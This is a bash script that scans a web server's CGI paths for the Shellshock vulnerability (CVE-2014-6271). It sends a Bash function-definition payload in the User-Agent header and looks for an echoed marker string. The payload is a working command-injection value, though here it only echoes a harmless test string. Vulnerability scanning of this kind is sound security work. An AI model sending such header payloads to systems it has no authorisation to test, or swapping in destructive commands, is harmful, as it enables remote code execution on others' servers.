#!/bin/bash

# Shellshock (CVE-2014-6271) Scanner - Built from Scratch
CVE_ID="CVE-2014-6271"
DESCRIPTION="Bash Remote Code Execution (Shellshock)"

# Source CVEHACK libraries if available
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/../../lib/colors.sh" ]]; then
    source "$SCRIPT_DIR/../../lib/colors.sh"
else
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
    print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
    print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
    print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
    print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
fi

scan_shellshock() {
    local target="$1"
    
    if [[ -z "$target" ]]; then
        print_error "Usage: $0 <target>"
        exit 1
    fi
    
    print_info "Testing $target for Shellshock (CVE-2014-6271)"
    
    # Test common CGI paths
    test_cgi_paths "$target"
    
    print_info "Shellshock scan completed"
}

test_cgi_paths() {
    local target="$1"
    print_info "Testing CGI paths for Shellshock..."
    
    local cgi_paths=(
        "/cgi-bin/test.cgi"
        "/cgi-bin/status"
        "/test.cgi"
    )
    
    local shellshock_payload="() { :; }; echo 'SHELLSHOCK_TEST'"
    
    for path in "${cgi_paths[@]}"; do
        print_info "Testing path: $path"
        
        if command -v curl &> /dev/null; then
            local response=$(curl -s -H "User-Agent: $shellshock_payload" "$target$path" 2>/dev/null)
            if echo "$response" | grep -q "SHELLSHOCK_TEST"; then
                print_error "POTENTIAL SHELLSHOCK VULNERABILITY DETECTED at $path"
            fi
        fi
    done
}

# Main execution
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    scan_shellshock "$1"
fi
